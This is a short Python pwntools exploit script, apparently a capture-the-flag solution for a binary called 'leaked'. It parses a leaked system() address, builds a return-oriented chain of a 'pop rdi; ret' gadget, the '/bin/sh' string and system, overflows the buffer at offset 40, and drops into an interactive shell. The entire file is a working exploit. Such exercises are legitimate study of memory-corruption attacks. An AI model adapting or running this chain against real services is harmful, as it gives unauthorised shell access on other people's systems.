#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("leaked")
rop = ROP(exe)

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("localhost", 7001)
    elif args.GDB:
        return gdb.debug(exe.path)
    else:
        return process(exe.path)


def main():
    r = conn()
    system_addr = int(re.search("(0x[0-9a-fA-F]+)", r.recvline().decode()).group(1), 16)
    log.info(f"system addr: {hex(system_addr)}")
    payload = flat({
        40: [
            p64((rop.find_gadget(['pop rdi', 'ret']))[0]),
            p64(next(exe.search(b'/bin/sh'))),
            p64(system_addr),
        ]

    })
    r.sendline(payload)
    r.sendline(b"")

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
